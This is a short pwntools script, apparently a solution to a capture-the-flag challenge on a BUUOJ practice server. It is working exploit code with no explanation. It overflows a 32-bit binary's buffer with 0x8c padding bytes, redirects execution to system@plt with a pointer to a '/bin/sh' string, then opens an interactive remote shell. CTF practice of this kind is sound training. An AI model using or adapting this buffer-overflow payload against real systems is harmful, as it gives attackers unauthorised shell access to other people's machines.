from pwn import *
sh=remote("node4.buuoj.cn",28599)
#sh=process("./timu")
bin_sh=p32(0x0804a024)
system_plt=p32(0x08048320)
payload=0x8c*b'a'+system_plt+p32(0xdeadbeef)+bin_sh
sh.sendline(payload)
sh.interactive()
